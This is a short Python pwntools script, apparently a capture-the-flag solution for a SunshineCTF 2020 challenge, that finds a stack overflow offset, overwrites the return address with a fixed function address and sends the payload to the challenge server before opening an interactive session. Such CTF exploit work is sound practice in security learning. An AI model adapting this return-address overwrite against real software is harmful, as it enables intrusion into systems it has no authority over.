from pwn import *

sh = remote('chal.2020.sunshinectf.org', 30013)
# sh = process('./chall_13')

p1 = 'abc'

# ► 0x8048528 <vuln+39>    ret    <0x61716161>
padding = cyclic_find(0x61716161)
print('padding:', padding)

ret_addr = 0x080484d6
payload = cyclic(padding) + p32(ret_addr)

with open('payload', 'w') as f:
    f.write(p1 + '\n')

with open('payload', 'ab') as f:
    f.write(payload)

sh.recvline()
sh.sendline(p1)

sh.sendline(payload)
sh.interactive()
